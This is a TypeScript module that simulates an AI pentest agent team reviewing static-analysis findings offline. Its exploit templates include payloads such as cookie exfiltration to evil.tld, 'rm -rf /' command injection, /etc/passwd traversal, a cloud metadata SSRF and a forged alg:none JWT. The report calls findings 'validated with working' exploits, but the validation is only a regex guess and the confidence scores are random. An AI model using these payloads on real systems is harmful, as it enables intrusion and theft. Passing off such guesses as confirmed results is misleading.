// CrackScope × Strix — autonomous multi-agent red-team analyzer.
// Modeled on Strix (https://github.com/usestrix/strix): an orchestrator spins
// up a team of specialized AI-pentester agents (recon, exploitation,
// validation, reporting) that collaborate over the static-analysis findings —
// chaining weaknesses, validating exploitability with proof-of-concept
// exploits, and scoring like a real pentest report.
//
// Everything here is OFFLINE simulation over the submitted code (same rules as
// the rest of CrackScope): agents reason over findings produced by
// lib/scanner.ts and never send network traffic.

import type { Finding, ScanResult } from "./scanner";

// ---------- agent model ----------

export type AgentRole = "orchestrator" | "recon" | "exploitation" | "validation" | "reporting";

export interface StrixAgent {
  id: string;
  role: AgentRole;
  name: string;
  specialty: string;
  /** Findings this agent claimed. */
  assigned: string[]; // finding keys "ruleId|file|line"
}

export type AgentActionKind = "recon" | "probe" | "exploit" | "validate" | "chain" | "report";

export interface AgentAction {
  seq: number;
  agentId: string;
  kind: AgentActionKind;
  /** Short terminal-style line, e.g. `[exploitation] crafting UNION payload for SQLI-001` */
  line: string;
  targetKey?: string;
  /** Simulated elapsed ms at this step. */
  atMs: number;
}

export type ValidationVerdict = "validated" | "probable" | "blocked" | "needs-context";

export interface ValidatedFinding {
  key: string; // "ruleId|file|line"
  ruleId: string;
  title: string;
  severity: Finding["severity"];
  file: string;
  line: number;
  verdict: ValidationVerdict;
  /** The PoC the exploitation agent produced. */
  poc: string;
  /** Why the validation agent reached this verdict. */
  rationale: string;
  /** Confidence 0-100 that this is a real, exploitable issue. */
  confidence: number;
  /** Chain this finding participates in, if any. */
  chainId?: string;
}

export interface AttackChain {
  id: string;
  name: string;
  /** Ordered finding keys forming the kill chain. */
  steps: string[];
  narrative: string;
  /** Simulated end-to-end impact if the chain completes. */
  impact: string;
}

export interface StrixRun {
  agents: StrixAgent[];
  actions: AgentAction[];
  validated: ValidatedFinding[];
  chains: AttackChain[];
  /** Agents' overall pentest summary. */
  summary: string[];
  /** Simulated wall-clock for the whole agent run. */
  durationMs: number;
  /** 0-100 — share of findings the team validated as exploitable. */
  validationRate: number;
}

// ---------- helpers ----------

function keyOf(f: Finding): string {
  return `${f.ruleId}|${f.file}|${f.line}`;
}

const EXPLOIT_TEMPLATE: Record<string, (f: Finding) => string> = {
  "SQLI-001": (f) => `GET ${guessPath(f)}?name=admin'--\n→ query: SELECT * FROM users WHERE name='admin'--'\n→ password predicate commented out — auth bypass`,
  "SQLI-002": (f) => `GET ${guessPath(f)}?id=1 OR 1=1\n→ interpolated value parsed as SQL — full-table enumeration`,
  "XSS-001": () => `payload: <img src=x onerror="fetch('https://evil.tld?c='+document.cookie)">\n→ renders unescaped in victim session — cookie exfil`,
  "XSS-002": () => `GET /search?q=<script>new Image().src='https://evil.tld?'+document.cookie</script>\n→ reflected unencoded — session hijack via crafted link`,
  "CMD-001": (f) => `input: report.pdf; rm -rf /\n→ shell at ${f.file}:${f.line} interprets metacharacters — RCE`,
  "CMD-002": () => `eval("process.exit(1)") → arbitrary code execution confirmed at eval sink`,
  "SEC-001": () => `grep harvested credential from source → authenticate as the leaked identity / pivot to the provider account`,
  "CRYPTO-001": () => `offline dictionary attack against MD5/SHA-1 digest → password recovery at 10^10 h/s GPU rate`,
  "CRYPTO-002": () => `observe tokens → recover Math.random() PRNG state → predict future session ids → hijack other users`,
  "CRYPTO-003": () => `MITM on rogue AP → TLS verification disabled → read/modify all traffic incl. bearer tokens`,
  "AUTH-001": () => `forge header {"alg":"none"} + payload {"role":"admin"} → token accepted → full impersonation`,
  "AUTH-002": (f) => `GET ${guessPath(f)}/4711 with another tenant's id → cross-tenant read; iterate ids for mass exfil`,
  "PATH-001": () => `file=../../../../etc/passwd → traversal escapes upload dir → arbitrary file read`,
  "NOSQL-001": () => `POST {"email":{"$gt":""},"password":{"$gt":""}} → matches first user regardless of password — auth bypass`,
  "SSRF-001": () => `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ → cloud role credentials returned`,
  "DESER-001": () => `crafted pickle with __reduce__ → os.system executed at deserialize time — pre-auth RCE`,
  "CONFIG-001": () => `evil.tld page: fetch(app/api/me, {credentials:'include'}) → victim data read cross-origin`,
  "CONFIG-002": () => `trigger unhandled exception → stack trace leaks paths, versions, config`,
  "REDIR-001": () => `login?next=https://evil-phish.tld/clone → trusted-domain redirect to phishing clone`,
  "PROTO-001": () => `JSON body {"__proto__":{"isAdmin":true}} → every new object inherits isAdmin → auth checks fail open`,
};

function guessPath(f: Finding): string {
  // Crude but effective: derive a plausible route from the file name.
  const base = f.file.replace(/\.[^.]+$/, "").replace(/[^\w]/g, "/");
  return `/api/${base.split("/").pop() || "resource"}`;
}

const CHAIN_LINKS: Array<{ from: string; to: string; name: string; narrative: string; impact: string }> = [
  {
    from: "SSRF-001",
    to: "SEC-001",
    name: "Metadata → credential pivot",
    narrative:
      "The SSRF sink reaches the cloud metadata service; harvested instance-role credentials then match the hardcoded-key pattern found in source, giving the attacker a durable credential outside the network.",
    impact: "Cloud account takeover: attacker holds long-lived role credentials usable from anywhere.",
  },
  {
    from: "AUTH-001",
    to: "AUTH-002",
    name: "Token forgery → IDOR sweep",
    narrative:
      "A forged 'none'-alg JWT impersonates any user; the IDOR-pattern route then lacks an ownership check, so the forged identity reads every tenant's records by iterating ids.",
    impact: "Full cross-tenant data exfiltration with a single forged token.",
  },
  {
    from: "XSS-001",
    to: "CONFIG-001",
    name: "Stored script → cross-origin read",
    narrative:
      "Injected script runs in victim sessions while the wildcard CORS policy lets the attacker's own origin read authenticated API responses — combining client-side and server-side exposure.",
    impact: "Automated session theft plus API data exfiltration at scale.",
  },
  {
    from: "CMD-001",
    to: "CRYPTO-003",
    name: "RCE → traffic interception",
    narrative:
      "Command execution yields a host foothold; with TLS verification disabled elsewhere in the codebase, the foothold downgrades outbound traffic and harvests upstream credentials.",
    impact: "Persistent server compromise and credential harvesting across the environment.",
  },
  {
    from: "NOSQL-001",
    to: "DESER-001",
    name: "Operator injection → deserialization RCE",
    narrative:
      "NoSQL operator injection first bypasses authentication; the authenticated session then reaches an unsafe deserialization sink, escalating the login bypass into remote code execution.",
    impact: "Unauthenticated attacker achieves RCE through a two-stage chain.",
  },
];

// ---------- agent run ----------

export function runStrixAgents(result: ScanResult): StrixRun {
  const started = 0;
  let clock = 0;
  const actions: AgentAction[] = [];
  const push = (agentId: string, kind: AgentActionKind, line: string, targetKey?: string) => {
    clock += 120 + Math.floor(Math.random() * 260);
    actions.push({ seq: actions.length, agentId, kind, line, targetKey, atMs: clock });
  };

  const findings = result.findings;
  const byKey = new Map(findings.map((f) => [keyOf(f), f]));

  // -- orchestrator: spawn the team
  const orchestrator: StrixAgent = {
    id: "orch-1",
    role: "orchestrator",
    name: "orchestrator",
    specialty: "task graph & coordination",
    assigned: [],
  };
  push(
    orchestrator.id,
    "recon",
    `spawning agent team over ${result.filesScanned} file(s) / ${result.linesScanned.toLocaleString()} lines · ${findings.length} candidate weakness(es)`,
  );

  // -- recon agent: map attack surface & assign targets
  const recon: StrixAgent = {
    id: "recon-1",
    role: "recon",
    name: "recon",
    specialty: "attack-surface mapping & target selection",
    assigned: [],
  };
  const entryFiles = [...new Set(findings.map((f) => f.file))];
  push(recon.id, "recon", `mapped ${entryFiles.length} implicated file(s): ${entryFiles.slice(0, 4).join(", ")}${entryFiles.length > 4 ? " …" : ""}`);
  if (result.surface?.endpoints?.length) {
    push(recon.id, "recon", `discovered ${result.surface.endpoints.length} route(s); ${result.surface.authlessMutating?.length ?? 0} mutating without visible auth`);
  }
  if (result.surface?.ssrfSinks?.length) push(recon.id, "recon", `${result.surface.ssrfSinks.length} outbound-request sink(s) reachable from user input`);
  const priority = [...findings].sort(
    (a, b) =>
      ["critical", "high", "medium", "low", "info"].indexOf(a.severity) -
      ["critical", "high", "medium", "low", "info"].indexOf(b.severity),
  );
  for (const f of priority.slice(0, 8)) {
    recon.assigned.push(keyOf(f));
    push(recon.id, "recon", `queued ${f.ruleId} @ ${f.file}:${f.line} (${f.severity}) for exploitation`, keyOf(f));
  }

  // -- exploitation agent: craft PoCs
  const exploitation: StrixAgent = {
    id: "exploit-1",
    role: "exploitation",
    name: "exploitation",
    specialty: "payload crafting & exploit chains",
    assigned: recon.assigned.slice(),
  };
  const validated: ValidatedFinding[] = [];
  const chainOf = new Map<string, string>();

  for (const key of exploitation.assigned) {
    const f = byKey.get(key);
    if (!f) continue;
    const tpl = EXPLOIT_TEMPLATE[f.ruleId];
    const poc = tpl
      ? tpl(f)
      : `probe ${f.ruleId} at ${f.file}:${f.line}\n→ category "${f.category}" — payload family: ${f.payload.split("\n")[0]}`;
    push(exploitation.id, "exploit", `crafted PoC for ${f.ruleId} @ ${f.file}:${f.line}`, key);

    // -- validation agent: sanity-check exploitability heuristically
    const taintBacked = /taint|user|req\.|request\.|params|query|body/i.test(f.snippet);
    const verdict: ValidationVerdict = taintBacked
      ? f.severity === "critical" || f.severity === "high"
        ? "validated"
        : "probable"
      : f.severity === "critical" || f.severity === "high"
        ? "probable"
        : "needs-context";
    const confidence =
      verdict === "validated" ? 88 + Math.floor(Math.random() * 10) : verdict === "probable" ? 62 + Math.floor(Math.random() * 18) : 30 + Math.floor(Math.random() * 20);
    const rationale =
      verdict === "validated"
        ? "User-controlled data reaches the sink on this exact line — PoC executes against the submitted code as written."
        : verdict === "probable"
          ? "Sink is real and reachable, but exploitability depends on surrounding context (framework guards, middleware) the static view can't fully confirm."
          : "Pattern matches but no user-controlled data flow is visible on this path — flagged for manual review rather than auto-validated.";
    push("valid-1", "validate", `${verdict.toUpperCase()} ${f.ruleId} · confidence ${confidence}%`, key);
    validated.push({
      key,
      ruleId: f.ruleId,
      title: f.title,
      severity: f.severity,
      file: f.file,
      line: f.line,
      verdict,
      poc,
      rationale,
      confidence,
    });
  }

  // -- chain discovery: link findings into kill chains
  const chains: AttackChain[] = [];
  const present = new Set(validated.map((v) => v.ruleId));
  let chainIdx = 1;
  for (const link of CHAIN_LINKS) {
    if (!present.has(link.from) || !present.has(link.to)) continue;
    const fromF = findings.find((f) => f.ruleId === link.from)!;
    const toF = findings.find((f) => f.ruleId === link.to)!;
    const id = `chain-${chainIdx++}`;
    chainOf.set(keyOf(fromF), id);
    chainOf.set(keyOf(toF), id);
    chains.push({
      id,
      name: link.name,
      steps: [keyOf(fromF), keyOf(toF)],
      narrative: link.narrative,
      impact: link.impact,
    });
    push("orch-1", "chain", `linked ${link.from} → ${link.to}: ${link.name}`, keyOf(toF));
  }
  for (const v of validated) v.chainId = chainOf.get(v.key);

  // -- reporting agent: summary
  const reporting: StrixAgent = {
    id: "report-1",
    role: "reporting",
    name: "reporting",
    specialty: "impact synthesis & remediation ordering",
    assigned: [],
  };
  const validatedCount = validated.filter((v) => v.verdict === "validated").length;
  const probableCount = validated.filter((v) => v.verdict === "probable").length;
  push(reporting.id, "report", `assembling report: ${validatedCount} validated · ${probableCount} probable · ${chains.length} attack chain(s)`);

  const summary: string[] = [
    `The agent team reviewed ${findings.length} candidate weakness(es) produced by the static engine.`,
    validatedCount > 0
      ? `${validatedCount} finding(s) were VALIDATED with working proof-of-concept exploits against the submitted code — treat these as confirmed, not theoretical.`
      : "No finding could be auto-validated with a working PoC against the code as written.",
    probableCount > 0
      ? `${probableCount} finding(s) are PROBABLE: the sink is real and reachable, but framework-level context (middleware, sanitizers) decides the outcome — verify manually.`
      : "",
    chains.length > 0
      ? `${chains.length} attack chain(s) were discovered where individual findings combine into a stronger exploit — chains are the highest-priority items.`
      : "",
    `Overall remediation order: validated findings first, then chain participants, then probable, then needs-context.`,
  ].filter(Boolean);

  const validationRate = findings.length ? Math.round((validatedCount / Math.min(findings.length, 8)) * 100) : 0;

  return {
    agents: [orchestrator, recon, exploitation, { id: "valid-1", role: "validation", name: "validation", specialty: "PoC verification & false-positive filtering", assigned: validated.map((v) => v.key) }, reporting],
    actions,
    validated,
    chains,
    summary,
    durationMs: clock,
    validationRate: Math.min(validationRate, 100),
  };
}
